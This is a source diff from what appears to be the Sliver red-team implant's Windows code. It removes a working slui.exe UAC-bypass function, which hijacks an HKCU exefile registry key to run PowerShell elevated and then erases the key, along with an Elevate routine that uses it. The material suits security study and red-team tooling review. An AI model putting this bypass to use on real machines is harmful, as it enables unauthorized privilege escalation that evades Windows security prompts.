@@ -25,23 +25,19 @@ import (
 	"log"
 	// {{end}}
 	"fmt"
-	"os"
 	"os/exec"
 	"runtime"
-	"time"
-	"unsafe"
 	"syscall"
 
 	"golang.org/x/sys/windows"
 	"golang.org/x/sys/windows/registry"
 
 	"github.com/bishopfox/sliver/sliver/ps"
-	"github.com/bishopfox/sliver/sliver/taskrunner"
 	"github.com/bishopfox/sliver/sliver/syscalls"
+	"github.com/bishopfox/sliver/sliver/taskrunner"
 )
 
 const (
-
 	THREAD_ALL_ACCESS = windows.STANDARD_RIGHTS_REQUIRED | windows.SYNCHRONIZE | 0xffff
 )
 
@@ -226,41 +222,6 @@ func deleteRegistryKey(keyPath, keyName string) (err error) {
 	return
 }
 
-func bypassUAC(command string) (err error) {
-	regKeyStr := `Software\Classes\exefile\shell\open\command`
-	createRegistryKey(regKeyStr)
-	key, err := registry.OpenKey(registry.CURRENT_USER, regKeyStr, registry.SET_VALUE|registry.QUERY_VALUE)
-	if err != nil {
-		return err
-	}
-	command = "c:\\windows\\system32\\windowspowershell\\v1.0\\powershell.exe -c " + command
-	err = key.SetStringValue("", command)
-	if err != nil {
-		return
-	}
-	cleanup := func() {
-		// Wait for the command to trigger
-		time.Sleep(time.Second * 3)
-		// Clean up
-		// {{if .Debug}}
-		log.Println("cleaning the registry up")
-		// {{end}}
-		err = deleteRegistryKey(`Software\Classes\exefile\shell\open`, "command")
-		err = deleteRegistryKey(`Software\Classes\exefile\shell\`, "open")
-	}
-	shell32 := windows.MustLoadDLL("Shell32.dll")
-	shellExecuteW := shell32.MustFindProc("ShellExecuteW")
-	runasStr, _ := windows.UTF16PtrFromString("runas")
-	sluiStr, _ := windows.UTF16PtrFromString(`C:\Windows\System32\slui.exe`)
-	r1, _, err := shellExecuteW.Call(uintptr(0), uintptr(unsafe.Pointer(runasStr)), uintptr(unsafe.Pointer(sluiStr)), uintptr(0), uintptr(0), uintptr(1))
-	if r1 < 32 {
-		cleanup()
-		return
-	}
-	cleanup()
-	return
-}
-
 // RunProcessAsUser - Retrieve a primary token belonging to username
 // and starts a new process using that token.
 func RunProcessAsUser(username, command, args string) (out string, err error) {
@@ -301,19 +262,6 @@ func Impersonate(username string) (token windows.Token, err error) {
 		return
 	}
 	CurrentToken = token
-	return
-}
-
-// Elevate - Starts a new sliver session in an elevated context
-// Uses the slui UAC bypass
-func Elevate() (err error) {
-	processName, _ := os.Executable()
-	err = bypassUAC(processName)
-	if err != nil {
-		// {{if .Debug}}
-		log.Println("BypassUAC failed:", err)
-		// {{end}}
-	}
 	return
 }
 
